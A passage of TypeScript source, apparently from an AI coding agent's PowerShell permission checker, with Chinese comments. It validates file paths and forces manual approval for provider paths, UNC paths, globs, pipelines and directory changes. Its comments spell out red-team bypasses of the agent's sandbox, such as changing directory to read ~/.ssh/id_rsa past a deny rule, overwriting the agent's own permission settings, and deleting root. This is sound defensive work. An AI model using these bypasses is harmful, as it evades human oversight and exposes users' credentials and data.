        resolvedPath: denyHit.resolvedPath,
        decisionReason: { type: 'rule', rule: denyHit.rule },
      }
    }
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: '路径中的反引号转义字符无法静态验证，需要手动批准',
      },
    }
  }

  // 安全检查：阻止模块限定的 provider 路径。PowerShell 允许
  // `Microsoft.PowerShell.Core\FileSystem::/etc/passwd`，通过 FileSystem provider 解析为
  // `/etc/passwd`。`::` 是 provider 路径分隔符，不匹配简单的
  // `^[a-z]{2,}:` 正则。
  if (normalizedPath.includes('::')) {
    // 剥离直到并包括第一个 :: 的所有内容 — 同时处理
    // FileSystem::/path 和 Microsoft.PowerShell.Core\FileSystem::/path。
    // 双 ::（Foo::Bar::/x）只剥离第一个 → 'Bar::/x' → resolve
    // 使其为 {cwd}/Bar::/x → 不匹配真实拒绝规则 → 回退到询问。
    // 安全。
    const afterProvider = normalizedPath.slice(normalizedPath.indexOf('::') + 2)
    const denyHit = checkDenyRuleForGuessedPath(
      afterProvider,
      cwd,
      toolPermissionContext,
      operationType,
    )
    if (denyHit) {
      return {
        allowed: false,
        resolvedPath: denyHit.resolvedPath,
        decisionReason: { type: 'rule', rule: denyHit.rule },
      }
    }
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: '模块限定的 provider 路径（::）无法静态验证，需要手动批准',
      },
    }
  }

  // 安全检查：阻止 UNC 路径 — 它们可以触发网络请求并
  // 泄露 NTLM/Kerberos 凭据
  if (
    normalizedPath.startsWith('//') ||
    /DavWWWRoot/i.test(normalizedPath) ||
    /@SSL@/i.test(normalizedPath)
  ) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: 'UNC 路径被阻止，因为它们可以触发网络请求和凭据泄露',
      },
    }
  }

  // 安全检查：拒绝包含 shell 展开语法的路径
  if (normalizedPath.includes('$') || normalizedPath.includes('%')) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: '路径中的变量展开语法需要手动批准',
      },
    }
  }

  // 安全检查：阻止非文件系统 provider 路径（env:、HKLM:、alias:、function: 等）
  // 这些路径访问非文件系统资源，必须要求手动批准。
  // 这捕获像 -Path:env:HOME 这样的冒号语法，其中提取的值是 'env:HOME'。
  //
  // 平台分割（发现 #21/#28）：
  // - Windows：在 ':' 前要求 2+ 字母，使原生驱动器字母（C:、D:）
  //   通过到正确处理它们的 path.win32.isAbsolute/resolve。
  // - POSIX：任何 <letters>: 前缀都是 PowerShell PSDrive — 单字母驱动器
  //   路径在 Linux/macOS 上没有原生意义。`New-PSDrive -Name Z -Root /etc`
  //   然后 `Get-Content Z:/secrets` 否则会通过
  //   path.posix.resolve(cwd, 'Z:/secrets') → '{cwd}/Z:/secrets' → 在 cwd 内 →
  //   允许，绕过 Read(/etc/**) 拒绝规则。我们无法静态知道 PSDrive
  //   映射到什么文件系统根，因此将 POSIX 上所有驱动器前缀的路径视为
  //   不可验证。
  // 在 PSDrive 名中包含数字（bug #23）：`New-PSDrive -Name 1 ...`
  // 创建驱动器 `1:` — 一个有效的 PSDrive 路径前缀。
  // Windows 正则要求 2+ 字符以排除单字母原生驱动器字母
  //（C:、D:）。使用单个字符类 [a-z0-9] 捕获混合字母数字
  // PSDrive 名如 `a1:`、`1a:` — 之前的交替 `[a-z]{2,}|[0-9]+`
  // 遗漏了那些，因为 `a1` 既不是纯字母也不是纯数字。
  const providerPathRegex =
    getPlatform() === 'windows' ? /^[a-z0-9]{2,}:/i : /^[a-z0-9]+:/i
  if (providerPathRegex.test(normalizedPath)) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: `路径 '${normalizedPath}' 使用非文件系统 provider，需要手动批准`,
      },
    }
  }

  // 安全检查：在写入/创建操作中阻止 glob 模式
  if (GLOB_PATTERN_REGEX.test(normalizedPath)) {
    if (operationType === 'write' || operationType === 'create') {
      return {
        allowed: false,
        resolvedPath: normalizedPath,
        decisionReason: {
          type: 'other',
          reason: '写入操作中不允许使用 glob 模式。请指定确切的文件路径。',
        },
      }
    }

    // 对于带路径遍历的读操作（例如 /project/*/../../../etc/shadow），
    // 解析完整路径（包括 glob 字符）并验证该解析路径。
    // 这捕获在 glob 之后通过 `..` 逃逸工作目录的模式。
    if (containsPathTraversal(normalizedPath)) {
      const absolutePath = isAbsolute(normalizedPath)
        ? normalizedPath
        : resolve(cwd, normalizedPath)
      const { resolvedPath, isCanonical } = safeResolvePath(
        getFsImplementation(),
        absolutePath,
      )
      const result = isPathAllowed(
        resolvedPath,
        toolPermissionContext,
        operationType,
        isCanonical ? [resolvedPath] : undefined,
      )
      return {
        allowed: result.allowed,
        resolvedPath,
        decisionReason: result.decisionReason,
      }
    }

    // 安全检查（发现 #15）：读操作的 glob 模式无法静态验证。
    // getGlobBaseDirectory 返回第一个 glob 字符之前的目录；
    // 只有该基础被 realpath。glob 匹配的任何内容（包括符号链接）从未被
    // 检查。示例：
    //   /project/*/passwd 带符号链接 /project/link → /etc
    // 基础目录是 /project（允许），但运行时将 * 展开为 'link' 并
    // 读取 /etc/passwd。我们无法在 glob 展开内验证符号链接，
    // 除非实际展开 glob（需要文件系统访问，并且
    // 仍与攻击者在验证后创建符号链接竞争）。
    //
    // 仍然检查基础目录上的拒绝规则，使显式 Read(/project/**)
    // 拒绝规则触发。如果没有拒绝匹配，强制询问。
    const basePath = getGlobBaseDirectory(normalizedPath)
    const absoluteBasePath = isAbsolute(basePath)
      ? basePath
      : resolve(cwd, basePath)
    const { resolvedPath } = safeResolvePath(
      getFsImplementation(),
      absoluteBasePath,
    )
    const permissionType = operationType === 'read' ? 'read' : 'edit'
    const denyRule = matchingRuleForInput(
      resolvedPath,
      toolPermissionContext,
      permissionType,
      'deny',
    )
    if (denyRule !== null) {
      return {
        allowed: false,
        resolvedPath,
        decisionReason: { type: 'rule', rule: denyRule },
      }
    }
    return {
      allowed: false,
      resolvedPath,
      decisionReason: {
        type: 'other',
        reason:
          '路径中的 glob 模式无法静态验证 — glob 展开内的符号链接未被检查。需要手动批准。',
      },
    }
  }

  // 解析路径
  const absolutePath = isAbsolute(normalizedPath)
    ? normalizedPath
    : resolve(cwd, normalizedPath)
  const { resolvedPath, isCanonical } = safeResolvePath(
    getFsImplementation(),
    absolutePath,
  )

  const result = isPathAllowed(
    resolvedPath,
    toolPermissionContext,
    operationType,
    isCanonical ? [resolvedPath] : undefined,
  )
  return {
    allowed: result.allowed,
    resolvedPath,
    decisionReason: result.decisionReason,
  }
}

function getGlobBaseDirectory(filePath: string): string {
  const globMatch = filePath.match(GLOB_PATTERN_REGEX)
  if (!globMatch || globMatch.index === undefined) {
    return filePath
  }
  const beforeGlob = filePath.substring(0, globMatch.index)
  const lastSepIndex = Math.max(
    beforeGlob.lastIndexOf('/'),
    beforeGlob.lastIndexOf('\\'),
  )
  if (lastSepIndex === -1) return '.'
  return beforeGlob.substring(0, lastSepIndex + 1) || '/'
}

/**
 * 可以作为字面路径字符串安全提取的元素类型。
 *
 * 只有具有静态已知字符串值的元素类型对路径
 * 提取是安全的。Variable 和 ExpandableString 具有运行时确定的值 —
// 即使它们在下游被防御（validatePath 的 `includes('$')` 检查和
// hasExpandableStrings 安全标志），在此处排除它们是直接纵深防御：
// 在最早的门处安全失败，而非依赖下游检查捕获它们。
 *
 * 任何其他类型（例如 ArrayLiteralExpressionAst 的 'Other'、'SubExpression'、
 * 'ScriptBlock'、'Variable'、'ExpandableString'）都无法静态验证，
 * 必须强制询问。
 */
const SAFE_PATH_ELEMENT_TYPES = new Set<string>(['StringConstant', 'Parameter'])

/**
 * 从解析的 PowerShell 命令元素中提取文件路径。
 * 使用 AST 参数查找位置和命名路径参数。
 *
 * 如果任何路径参数具有无法静态验证的复杂 elementType（例如数组字面量、
 * 子表达式），设置 hasUnvalidatablePathArg 以便调用方强制询问。
 */
function extractPathsFromCommand(cmd: ParsedCommandElement): {
  paths: string[]
  operationType: FileOperationType
  hasUnvalidatablePathArg: boolean
  optionalWrite: boolean
} {
  const canonical = resolveToCanonical(cmd.name)
  const config = CMDLET_PATH_CONFIG[canonical]

  if (!config) {
    return {
      paths: [],
      operationType: 'read',
      hasUnvalidatablePathArg: false,
      optionalWrite: false,
    }
  }

  // 构建每个 cmdlet 的已知参数集，合并通用参数。
  const switchParams = [...config.knownSwitches, ...COMMON_SWITCHES]
  const valueParams = [...config.knownValueParams, ...COMMON_VALUE_PARAMS]

  const paths: string[] = []
  const args = cmd.args
  // elementTypes[0] 是命令名；elementTypes[i+1] 对应 args[i]
  const elementTypes = cmd.elementTypes
  let hasUnvalidatablePathArg = false
  let positionalsSeen = 0
  const positionalSkip = config.positionalSkip ?? 0

  function checkArgElementType(argIdx: number): void {
    if (!elementTypes) return
    const et = elementTypes[argIdx + 1]
    if (et && !SAFE_PATH_ELEMENT_TYPES.has(et)) {
      hasUnvalidatablePathArg = true
    }
  }

  // 提取命名参数值（例如 -Path "C:\foo"）
  for (let i = 0; i < args.length; i++) {
    const arg = args[i]
    if (!arg) continue

    // 检查此参数是否是参数名。
    // 安全检查：使用 elementTypes 作为真值。PowerShell 的 tokenizer
    // 接受 en-dash/em-dash/horizontal-bar（U+2013/2014/2015）作为参数
    // 前缀；原始的 startsWith('-') 检查会遗漏 `–Path`（en-dash）。
    // 解析器将 CommandParameterAst 映射到 'Parameter'，无论横杠字符如何。
    // isPowerShellParameter 还正确拒绝带引号的 "-Include"
    //（StringConstant，不是参数）。
    const argElementType = elementTypes ? elementTypes[i + 1] : undefined
    if (isPowerShellParameter(arg, argElementType)) {
      // 处理冒号语法：-Path:C:\secret
      // 将 Unicode 横杠规范化为 ASCII `-`（pathParams 以 `-` 存储）。
      const normalized = '-' + arg.slice(1)
      const colonIdx = normalized.indexOf(':', 1) // 跳过第一个字符（横杠）
      const paramName =
        colonIdx > 0 ? normalized.substring(0, colonIdx) : normalized
      const paramLower = paramName.toLowerCase()

      if (matchesParam(paramLower, config.pathParams)) {
        // 已知路径参数 — 提取其值作为路径。
        let value: string | undefined
        if (colonIdx > 0) {
          // 冒号语法：-Path:value — 整个是一个元素。
          // 安全检查：逗号分隔值（例如 -Path:safe.txt,/etc/passwd）
          // 在 CommandParameterAst 内产生 ArrayLiteralExpressionAst。
          // PowerShell 写入所有路径，但我们看到单个字符串。
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          } else {
            value = rawValue
          }
        } else {
          // 标准语法：-Path value
          const nextVal = args[i + 1]
          const nextType = elementTypes ? elementTypes[i + 2] : undefined
          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
            value = nextVal
            checkArgElementType(i + 1)
            i++ // 跳过值
          }
        }
        if (value) {
          paths.push(value)
        }
      } else if (
        config.leafOnlyPathParams &&
        matchesParam(paramLower, config.leafOnlyPathParams)
      ) {
        // 仅叶子路径参数（例如 New-Item -Name）。PowerShell 相对
        // 另一个参数（-Path）解析，而非 cwd。validatePath
        // 相对 cwd 解析（L930），因此非叶子值（分隔符、
        // 遍历）解析到错误位置并可能错过拒绝规则
        //（拒绝→询问降级）。提取简单叶子文件名；标记任何
        // 类路径内容。
        let value: string | undefined
        if (colonIdx > 0) {
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          } else {
            value = rawValue
          }
        } else {
          const nextVal = args[i + 1]
          const nextType = elementTypes ? elementTypes[i + 2] : undefined
          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
            value = nextVal
            checkArgElementType(i + 1)
            i++
          }
        }
        if (value !== undefined) {
          if (
            value.includes('/') ||
            value.includes('\\') ||
            value === '.' ||
            value === '..'
          ) {
            // 非叶子：分隔符或遍历。无法正确解析，
            // 除非连接到 -Path。强制询问。
            hasUnvalidatablePathArg = true
          } else {
            // 简单叶子：提取。解析为 cwd/leaf（略错 —
            // 应为 <-Path>/leaf）但 -Path 提取覆盖目录，
            // 叶子文件名无法遍历到任何地方。
            paths.push(value)
          }
        }
      } else if (matchesParam(paramLower, switchParams)) {
        // 已知开关参数 — 不接受值，不要消费下一个参数。
        //（开关上的冒号语法，例如 -Confirm:$false，自包含在
        // 一个 token 中，并正确在此处穿透，不消费。）
      } else if (matchesParam(paramLower, valueParams)) {
        // 已知接受值的非路径参数（例如 -Encoding UTF8、-Filter *.txt）。
        // 消费其值；不作为路径验证，但要检查 elementType。
        // 安全检查：任何参数位置的 Variable elementType（例如 $env:ANTHROPIC_API_KEY）
        // 意味着运行时值不可静态知。
        // 没有此检查，`-Value $env:SECRET` 将在 acceptEdits 模式下被静默自动允许，
        // 因为 Variable elementType 从未被检查。
        if (colonIdx > 0) {
          // 冒号语法：-Value:$env:FOO — 值嵌入 token 中。
          // 外部 CommandParameterAst 的 'Parameter' 类型掩盖了内部
          // 表达式类型。检查指示非静态值的表达式标记
          //（与 pathParams 冒号语法防护对称）。
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          }
        } else {
          const nextArg = args[i + 1]
          const nextArgType = elementTypes ? elementTypes[i + 2] : undefined
          if (nextArg && !isPowerShellParameter(nextArg, nextArgType)) {
            checkArgElementType(i + 1)
            i++ // 跳过参数的值
          }
        }
      } else {
        // 未知参数 — 我们不理解此调用。
        // 安全检查：这是 KNOWN_SWITCH_PARAMS
        // 打地鼠的结构性修复。与其猜测此参数是开关
        //（并冒吞下位置路径的风险）还是接受值（并冒
        // 相同风险），我们将整个命令标记为不可验证。
        // 调用方将强制询问。
        hasUnvalidatablePathArg = true
        // 安全检查：即使我们不识别此参数，如果它使用
        // 冒号语法（-UnknownParam:/etc/hosts），绑定的值可能是
        // 文件系统路径。将其提取到 paths[] 中，使拒绝规则匹配
        // 仍然运行。没有此检查，值被困在单个
        // token 内，paths=[] 意味着拒绝规则从未被咨询 —
        // 将拒绝降级为询问。这是纵深防御：主要
        // 修复是在上方将所有已知别名添加到 pathParams。
        if (colonIdx > 0) {
          const rawValue = arg.substring(colonIdx + 1)
          if (!hasComplexColonValue(rawValue)) {
            paths.push(rawValue)
          }
        }
        // 继续循环，使我们仍提取任何可识别路径
        //（对询问消息有用），但标志确保整体 '询问'。
      }
      continue
    }

    // 位置参数：作为路径提取（例如 Get-Content file.txt）
    // 第一个位置参数通常是源路径。
    // 跳过非路径值的前导位置参数（例如 iwr 的 -Uri）。
    if (positionalsSeen < positionalSkip) {
      positionalsSeen++
      continue
    }
    positionalsSeen++
    checkArgElementType(i)
    paths.push(arg)
  }

  return {
    paths,
    operationType: config.operationType,
    hasUnvalidatablePathArg,
    optionalWrite: config.optionalWrite ?? false,
  }
}

/**
 * 检查 PowerShell 命令的路径约束。
 * 从解析的 AST 中提取文件路径并验证它们在
 * 允许的目录内。
 *
 * @param compoundCommandHasCd - 完整复合命令是否包含
 *   cwd 更改 cmdlet（Set-Location/Push-Location/Pop-Location/New-PSDrive，
 *   排除到 CWD 的无操作 Set-Location）。当为 true 时，任何
 *   语句中的相对路径都不能被信任 — PowerShell 按顺序执行语句，
    // 语句 N 中的 cd 改变语句 N+1 的 cwd，但此
    //   验证器针对过期的 Node 进程 cwd 解析所有路径。
 *   BashTool 对等（BashTool/pathValidation.ts:630-655）。
 *
 * @returns
 * - 'ask' 当任何路径命令尝试访问允许目录之外时
 * - 'deny' 当拒绝规则显式阻止路径时
 * - 'passthrough' 当没有找到路径命令或所有路径有效时
 */
export function checkPathConstraints(
  input: { command: string },
  parsed: ParsedPowerShellCommand,
  toolPermissionContext: ToolPermissionContext,
  compoundCommandHasCd = false,
): PermissionResult {
  if (!parsed.valid) {
    return {
      behavior: 'passthrough',
      message: '无法为未解析的命令验证路径',
    }
  }

  // 安全检查：两阶段方法 — 检查所有语句/路径，使拒绝规则
  // 总是优先于询问。没有此检查，语句 1 上的询问
  // 可能在检查语句 2 的拒绝规则之前返回，让
  // 用户批准包含被拒绝路径的命令。
  let firstAsk: PermissionResult | undefined

  for (const statement of parsed.statements) {
    const result = checkPathConstraintsForStatement(
      statement,
      toolPermissionContext,
      compoundCommandHasCd,
    )
    if (result.behavior === 'deny') {
      return result
    }
    if (result.behavior === 'ask' && !firstAsk) {
      firstAsk = result
    }
  }

  return (
    firstAsk ?? {
      behavior: 'passthrough',
      message: '所有路径约束验证成功',
    }
  )
}

function checkPathConstraintsForStatement(
  statement: ParsedPowerShellCommand['statements'][number],
  toolPermissionContext: ToolPermissionContext,
  compoundCommandHasCd = false,
): PermissionResult {
  const cwd = getCwd()
  let firstAsk: PermissionResult | undefined

  // 安全检查：BashTool 对等 — 阻止包含 cwd 更改 cmdlet 的复合命令中的
  // 路径操作（BashTool/pathValidation.ts:630-655）。
  //
  // 当复合包含 Set-Location/Push-Location/Pop-Location/
  // New-PSDrive 时，后续语句中的相对路径在运行时针对
  // 更改的 cwd 解析，但此验证器针对过期的
  // getCwd() 快照解析它们。示例攻击（发现 #3）：
  //   Set-Location ./.hclaude; Set-Content ./settings.json '...'
  // 验证器看到 ./settings.json → /project/settings.json（不是 config 文件）。
  // 运行时写入 /project/.hclaude/settings.json（Claude 的权限 config）。
  //
  // 替代方法（被拒绝）：通过语句链模拟 cwd —
  // 在 `Set-Location ./.hclaude` 之后，用 cwd='./.hclaude' 验证后续语句。
  // 这会更宽松，但需要仔细处理：
  //   - Push-Location/Pop-Location 栈语义
  //   - 无参数的 Set-Location（→ 在某些平台上是 home）
  //   - New-PSDrive 根映射（任意文件系统根）
  //   - cd 可能执行或不执行的条件/循环语句
  //   - cd 目标无法静态确定的错误情况
  // 目前我们采取保守的手动批准方法。
  //
  // 与 BashTool 基于 `operationType !== 'read'` 门控不同，我们也阻止
  // 读取（发现 #27）：`Set-Location ~; Get-Content ./.ssh/id_rsa` 绕过
  // Read(~/.ssh/**) 拒绝规则，因为验证器对
  // /project/.ssh/id_rsa 匹配拒绝。从错误解析路径读取泄露数据，就像
  // 写入破坏数据一样。我们仍在下方运行拒绝规则匹配（通过 firstAsk，
  // 非早返回），使过期解析路径上的显式拒绝规则被
  // 遵守 — 拒绝 > 询问在调用方的 reduce 中。
  if (compoundCommandHasCd) {
    firstAsk = {
      behavior: 'ask',
      message:
        '复合命令更改工作目录（Set-Location/Push-Location/Pop-Location/New-PSDrive）— 相对路径无法针对原始 cwd 验证，需要手动批准',
      decisionReason: {
        type: 'other',
        reason: '复合命令包含 cd 和路径操作 — 需要手动批准以防止路径解析绕过',
      },
    }
  }

  // 安全检查：跟踪此语句是否包含非 CommandAst 管道
  // 元素（字符串字面量、变量、数组表达式）。PowerShell 将
  // 这些值管道到下游 cmdlet，通常绑定到 -Path。示例：
  // `'/etc/passwd' | Remove-Item` — 字符串被管道到 Remove-Item 的 -Path，
  // 但 Remove-Item 没有显式参数，因此 extractPathsFromCommand 返回
  // 零路径，命令会穿透。如果任何下游 cmdlet
  // 与表达式源一起出现，我们强制询问 — 管道
  // 路径无论操作类型如何都不可验证（读泄露数据；
  // 写破坏它）。
  let hasExpressionPipelineSource = false
  // 跟踪非 CommandAst 元素的文本用于拒绝规则猜测（发现 #23）。
  // `'.git/hooks/pre-commit' | Remove-Item` — 路径通过管道传来，paths=[]
  // 来自 extractPathsFromCommand，因此下方的拒绝循环从不迭代。我们
  // 将管道源文本通过 checkDenyRuleForGuessedPath 馈送，使
  // 显式 Edit(.git/**) 拒绝规则仍然触发。
  let pipelineSourceText: string | undefined

  for (const cmd of statement.commands) {
    if (cmd.elementType !== 'CommandAst') {
      hasExpressionPipelineSource = true
      pipelineSourceText = cmd.text
      continue
    }

    const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
      extractPathsFromCommand(cmd)

    // 安全检查：从表达式源接收管道路径的 cmdlet。
    // `'/etc/shadow' | Get-Content` — Get-Content 提取零路径
    //（无显式参数）。路径来自管道，我们无法
    // 静态验证。之前豁免读取（`operationType !== 'read'`），
    // 但那是绕过（评审评论 2885739292）：从
    // 不可验证路径读取仍是安全风险。无论操作类型如何都询问。
    if (hasExpressionPipelineSource) {
      const canonical = resolveToCanonical(cmd.name)
      // 安全检查（发现 #23）：在回退到询问之前，检查
      // 管道源文本是否匹配拒绝规则。`'.git/hooks/pre-commit' |
      // Remove-Item` 在配置 Edit(.git/**) 时应拒绝（非询问）。
      // 剥离外围引号（字符串字面量在 .text 中带引号）并
      // 馈送通过用于 ::/反引号路径的相同拒绝猜测助手。
      if (pipelineSourceText !== undefined) {
        const stripped = pipelineSourceText.replace(/^['"]|['"]$/g, '')
        const denyHit = checkDenyRuleForGuessedPath(
          stripped,
          cwd,
          toolPermissionContext,
          operationType,
        )
        if (denyHit) {
          return {
            behavior: 'deny',
            message: `${canonical} 针对 '${denyHit.resolvedPath}' 被拒绝规则阻止`,
            decisionReason: { type: 'rule', rule: denyHit.rule },
          }
        }
      }
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} 从无法静态验证的管道表达式源接收路径，需要手动批准`,
      }
      // 不要 continue — 穿透到路径循环，使拒绝规则在
      // 提取路径上仍然被检查。
    }

    // 安全检查：数组字面量、子表达式和其他复杂
    // 参数类型无法静态验证。像
    // `-Path ./safe.txt, /etc/passwd` 的数组字面量产生单个 'Other'
    // 元素，其组合文本可能在 CWD 内解析，而
    // PowerShell 实际上写入数组中的所有路径。
    if (hasUnvalidatablePathArg) {
      const canonical = resolveToCanonical(cmd.name)
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} 使用无法静态验证的参数或复杂路径表达式（数组字面量、子表达式、未知参数等），需要手动批准`,
      }
      // 不要 continue — 穿透到路径循环，使拒绝规则在
      // 提取路径上仍然被检查。
    }

    // 安全检查：CMDLET_PATH_CONFIG 中提取零路径的写入 cmdlet。
    // 要么（a）cmdlet 完全没有参数（`Remove-Item` 单独 —
    // PowerShell 会报错，但我们不应乐观地假设），或
    //（b）我们未能在参数中识别路径（不应
    // 在未知参数故障安全下发生，但纵深防御）。保守：
    // 无验证目标的写入操作 → 询问。
    // 读 cmdlet 和 pop-location（pathParams: []）被豁免。
    // optionalWrite cmdlet（无 -OutFile 的 Invoke-WebRequest/Invoke-RestMethod）
    // 也被豁免 — 它们只在存在 pathParam 时写入磁盘；
    // 没有它，输出到管道。
    // 上方的 hasUnvalidatablePathArg 检查已经覆盖未知参数情况。
    if (
      operationType !== 'read' &&
      !optionalWrite &&
      paths.length === 0 &&
      CMDLET_PATH_CONFIG[resolveToCanonical(cmd.name)]
    ) {
      const canonical = resolveToCanonical(cmd.name)
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} 是写入操作但无法确定目标路径；需要手动批准`,
      }
      continue
    }

    // 安全检查：删除 cmdlet 在
    // 系统关键路径上的 bash 对等硬拒绝。BashTool 有 isDangerousRemovalPath，它
    // 硬拒绝 `rm /`、`rm ~`、`rm /etc` 等，无论用户配置如何。
    // 移植：remove-item（和别名 rm/del/ri/rd/rmdir/erase → resolveToCanonical）
    // 在危险路径上 → 拒绝（非询问）。用户无法批准 system32 删除。
    const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'

    for (const filePath of paths) {
      // 硬拒绝删除危险系统路径（/、~、/etc 等）。
      // 先检查原始路径（realpath 之前）：safeResolvePath 可以
      // 将 '/' 规范化为 'C:\'（Windows）或 '/var/...' → '/private/var/...'
      //（macOS），这会击败 isDangerousRemovalPath 的字符串比较。
      if (isRemoval && isDangerousRemovalRawPath(filePath)) {
        return dangerousRemovalDeny(filePath)
      }

      const { allowed, resolvedPath, decisionReason } = validatePath(
        filePath,
        cwd,
        toolPermissionContext,
        operationType,
      )

      // 也检查解析路径 — 捕获解析到
      // 受保护位置的符号链接。
      if (isRemoval && isDangerousRemovalPath(resolvedPath)) {
        return dangerousRemovalDeny(resolvedPath)
      }

      if (!allowed) {
        const canonical = resolveToCanonical(cmd.name)
        const workingDirs = Array.from(
          allWorkingDirectories(toolPermissionContext),
        )
        const dirListStr = formatDirectoryList(workingDirs)

        const message =
          decisionReason?.type === 'other' ||
          decisionReason?.type === 'safetyCheck'
            ? decisionReason.reason
            : `${canonical} 针对的目标 '${resolvedPath}' 被阻止。出于安全考虑，Claude Code 在此会话中只能访问允许的工作目录中的文件：${dirListStr}。`

        if (decisionReason?.type === 'rule') {
          return {
            behavior: 'deny',
            message,
            decisionReason,
          }
        }

        const suggestions: PermissionUpdate[] = []
        if (resolvedPath) {
          if (operationType === 'read') {
            const suggestion = createReadRuleSuggestion(
              getDirectoryForPath(resolvedPath),
              'session',
            )
            if (suggestion) {
              suggestions.push(suggestion)
            }
          } else {
            suggestions.push({
              type: 'addDirectories',
              directories: [getDirectoryForPath(resolvedPath)],
              destination: 'session',
            })
          }
        }

        if (operationType === 'write' || operationType === 'create') {
          suggestions.push({
            type: 'setMode',
            mode: 'acceptEdits',
            destination: 'session',
          })
        }

        firstAsk ??= {
          behavior: 'ask',
          message,
          blockedPath: resolvedPath,
          decisionReason,
          suggestions,
        }
      }
    }
  }

  // 也检查控制流中的嵌套命令
  if (statement.nestedCommands) {
    for (const cmd of statement.nestedCommands) {
      const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
        extractPathsFromCommand(cmd)

      if (hasUnvalidatablePathArg) {
        const canonical = resolveToCanonical(cmd.name)
        firstAsk ??= {
          behavior: 'ask',
          message: `${canonical} 使用无法静态验证的参数或复杂路径表达式（数组字面量、子表达式、未知参数等），需要手动批准`,
        }
        // 不要 continue — 穿透到路径循环进行拒绝检查。
      }

      // 安全检查：零提取路径的写入 cmdlet（与主循环对称）。
      // optionalWrite cmdlet 豁免 — 见主循环注释。
      if (
        operationType !== 'read' &&
        !optionalWrite &&
        paths.length === 0 &&
        CMDLET_PATH_CONFIG[resolveToCanonical(cmd.name)]
      ) {
        const canonical = resolveToCanonical(cmd.name)
        firstAsk ??= {
          behavior: 'ask',
          message: `${canonical} 是写入操作但无法确定目标路径；需要手动批准`,
        }
        continue
      }

      // 安全检查：系统关键路径上删除的 bash 对等硬拒绝 —
      // 与上方主循环检查对称。没有此检查，
      // `if ($true) { Remove-Item / }` 通过 nestedCommands 路由并
      // 将拒绝→询问降级，让用户批准根删除。
      const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'

      for (const filePath of paths) {
        // 先检查原始路径（realpath 之前）；见主循环注释。
        if (isRemoval && isDangerousRemovalRawPath(filePath)) {
          return dangerousRemovalDeny(filePath)
        }

        const { allowed, resolvedPath, decisionReason } = validatePath(
          filePath,
          cwd,
          toolPermissionContext,
          operationType,
        )

        if (isRemoval && isDangerousRemovalPath(resolvedPath)) {
          return dangerousRemovalDeny(resolvedPath)
        }

        if (!allowed) {
          const canonical = resolveToCanonical(cmd.name)
          const workingDirs = Array.from(
            allWorkingDirectories(toolPermissionContext),
          )
          const dirListStr = formatDirectoryList(workingDirs)

          const message =
            decisionReason?.type === 'other' ||
            decisionReason?.type === 'safetyCheck'
              ? decisionReason.reason
              : `${canonical} 针对的目标 '${resolvedPath}' 被阻止。出于安全考虑，Claude Code 在此会话中只能访问允许的工作目录中的文件：${dirListStr}。`

          if (decisionReason?.type === 'rule') {
            return {
              behavior: 'deny',
              message,
              decisionReason,
            }
          }

          const suggestions: PermissionUpdate[] = []
          if (resolvedPath) {
            if (operationType === 'read') {
              const suggestion = createReadRuleSuggestion(
                getDirectoryForPath(resolvedPath),
                'session',
              )
              if (suggestion) {
                suggestions.push(suggestion)
              }
            } else {
              suggestions.push({
                type: 'addDirectories',
                directories: [getDirectoryForPath(resolvedPath)],
                destination: 'session',
              })
            }
          }

          if (operationType === 'write' || operationType === 'create') {
            suggestions.push({
              type: 'setMode',
              mode: 'acceptEdits',
              destination: 'session',
            })
          }

          firstAsk ??= {
            behavior: 'ask',
            message,
            blockedPath: resolvedPath,
            decisionReason,
            suggestions,
          }
        }
      }

      // 红队 P11/P14：powershellPermissions.ts:970 的步骤 5 已经
      // 通过相同的合成 CommandExpressionAst 机制捕获了
      // 此情况 — 这是双保险，使嵌套循环不依赖那个
      // 意外。放置在路径循环之后，使特定询问（blockedPath、
      // 建议）通过 ??= 获胜。
      if (hasExpressionPipelineSource) {
        firstAsk ??= {
          behavior: 'ask',
          message: `${resolveToCanonical(cmd.name)} 出现在控制流或链语句中，其中管道表达式源无法静态验证，需要手动批准`,
        }
      }
    }
  }

  // 检查嵌套命令上的重定向（例如来自 && / || 链）
  if (statement.nestedCommands) {
    for (const cmd of statement.nestedCommands) {
      if (cmd.redirections) {
        for (const redir of cmd.redirections) {
          if (redir.isMerging) continue
          if (!redir.target) continue
          if (isNullRedirectionTarget(redir.target)) continue

          const { allowed, resolvedPath, decisionReason } = validatePath(
            redir.target,
            cwd,
            toolPermissionContext,
            'create',
          )

          if (!allowed) {
            const workingDirs = Array.from(
              allWorkingDirectories(toolPermissionContext),
            )
            const dirListStr = formatDirectoryList(workingDirs)

            const message =
              decisionReason?.type === 'other' ||
              decisionReason?.type === 'safetyCheck'
                ? decisionReason.reason
                : `输出重定向到 '${resolvedPath}' 被阻止。出于安全考虑，Claude Code 在此会话中只能写入允许的工作目录中的文件：${dirListStr}。`

            if (decisionReason?.type === 'rule') {
              return {
                behavior: 'deny',
                message,
                decisionReason,
              }
            }

            firstAsk ??= {
              behavior: 'ask',
              message,
              blockedPath: resolvedPath,
              decisionReason,
              suggestions: [
                {
                  type: 'addDirectories',
                  directories: [getDirectoryForPath(resolvedPath)],
                  destination: 'session',
                },
              ],
            }
          }
        }
      }
    }
  }

  // 检查文件重定向
  if (statement.redirections) {
    for (const redir of statement.redirections) {
      if (redir.isMerging) continue
      if (!redir.target) continue
